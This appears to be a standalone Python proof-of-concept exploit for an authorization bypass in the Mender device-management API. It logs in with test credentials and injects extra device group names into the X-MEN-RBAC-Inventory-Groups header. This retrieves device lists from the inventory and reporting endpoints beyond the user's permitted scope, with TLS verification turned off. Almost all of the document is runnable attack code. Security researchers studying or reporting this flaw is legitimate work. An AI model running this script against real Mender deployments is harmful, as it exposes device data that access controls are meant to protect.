#!/usr/bin/env python3
"""
Proof of Concept: RBAC Scope Header Injection / Authorization Bypass
Vulnerability #1 - CRITICAL

This POC demonstrates how an attacker can inject arbitrary device group names
in the X-MEN-RBAC-Inventory-Groups header to bypass RBAC restrictions.

WARNING: Only use this on systems you own or have explicit permission to test.
"""

import requests
import json
import sys

# Configuration
BASE_URL = "https://staging.hosted.mender.io"  # Change to your test instance
USER_EMAIL = "test@example.com"
USER_PASSWORD = "testpassword"

def login(base_url, email, password):
    """Login and get JWT token"""
    print(f"[*] Attempting to login as {email}...")
    
    url = f"{base_url}/api/management/v1/useradm/auth/login"
    headers = {
        "Content-Type": "application/json"
    }
    
    # Basic auth for login
    response = requests.post(
        url,
        headers=headers,
        auth=(email, password),
        json={},
        verify=False  # For testing only
    )
    
    if response.status_code == 200:
        token = response.text.strip()
        print(f"[+] Login successful! Token: {token[:50]}...")
        return token
    else:
        print(f"[-] Login failed: {response.status_code}")
        print(f"    Response: {response.text}")
        return None

def test_rbac_bypass(base_url, token, authorized_group, unauthorized_groups):
    """
    Test RBAC bypass by injecting unauthorized groups in the header
    """
    print(f"\n[*] Testing RBAC header injection...")
    print(f"    Authorized group: {authorized_group}")
    print(f"    Attempting to access: {', '.join(unauthorized_groups)}")
    
    # Test 1: Normal request with authorized group
    print(f"\n[TEST 1] Normal request with authorized group only")
    headers = {
        "Authorization": f"Bearer {token}",
        "X-MEN-RBAC-Inventory-Groups": authorized_group,
        "Content-Type": "application/json"
    }
    
    url = f"{base_url}/api/management/v1/inventory/devices"
    response = requests.get(url, headers=headers, verify=False)
    print(f"    Status: {response.status_code}")
    if response.status_code == 200:
        devices = response.json()
        print(f"    Devices returned: {len(devices)}")
    
    # Test 2: Injection attack - authorized + unauthorized groups
    print(f"\n[TEST 2] INJECTION ATTACK - Adding unauthorized groups")
    injected_groups = f"{authorized_group},{','.join(unauthorized_groups)}"
    headers = {
        "Authorization": f"Bearer {token}",
        "X-MEN-RBAC-Inventory-Groups": injected_groups,
        "Content-Type": "application/json"
    }
    
    response = requests.get(url, headers=headers, verify=False)
    print(f"    Status: {response.status_code}")
    if response.status_code == 200:
        devices = response.json()
        print(f"    [VULNERABLE] Devices returned: {len(devices)}")
        print(f"    [VULNERABLE] Successfully bypassed RBAC restrictions!")
        
        # Check if we got devices from unauthorized groups
        if len(devices) > 0:
            print(f"\n[!] VULNERABILITY CONFIRMED!")
            print(f"    Retrieved {len(devices)} devices, potentially from unauthorized groups")
            print(f"    Sample device IDs:")
            for device in devices[:5]:
                print(f"      - {device.get('id', 'N/A')}")
            return True
    else:
        print(f"    Response: {response.text[:200]}")
    
    # Test 3: Reporting API search with injected groups
    print(f"\n[TEST 3] Testing Reporting API search with injected groups")
    search_url = f"{base_url}/api/management/v1/reporting/devices/search"
    headers = {
        "Authorization": f"Bearer {token}",
        "X-MEN-RBAC-Inventory-Groups": injected_groups,
        "Content-Type": "application/json"
    }
    
    search_payload = {
        "page": 1,
        "per_page": 10,
        "filters": []
    }
    
    response = requests.post(search_url, headers=headers, json=search_payload, verify=False)
    print(f"    Status: {response.status_code}")
    if response.status_code == 200:
        result = response.json()
        total = response.headers.get('X-Total-Count', 'N/A')
        print(f"    [VULNERABLE] Search successful! Total devices: {total}")
        return True
    
    return False

def main():
    print("=" * 70)
    print("POC: RBAC Scope Header Injection / Authorization Bypass")
    print("Vulnerability #1 - CRITICAL")
    print("=" * 70)
    
    if len(sys.argv) < 2:
        print("\nUsage: python3 vulnerability_1_rbac_header_injection.py <base_url>")
        print("Example: python3 vulnerability_1_rbac_header_injection.py https://staging.hosted.mender.io")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    # Login
    token = login(base_url, USER_EMAIL, USER_PASSWORD)
    if not token:
        print("[-] Cannot proceed without authentication token")
        sys.exit(1)
    
    # Test RBAC bypass
    # Replace with actual group names from your test environment
    authorized_group = "group1"  # User's authorized group
    unauthorized_groups = ["admin-group", "sensitive-group", "production"]  # Groups user shouldn't access
    
    is_vulnerable = test_rbac_bypass(base_url, token, authorized_group, unauthorized_groups)
    
    print("\n" + "=" * 70)
    if is_vulnerable:
        print("[!] VULNERABILITY CONFIRMED: RBAC header injection successful")
        print("[!] The system accepts client-controlled RBAC headers without validation")
    else:
        print("[?] Could not confirm vulnerability - may be patched or test data insufficient")
    print("=" * 70)

if __name__ == "__main__":
    main()

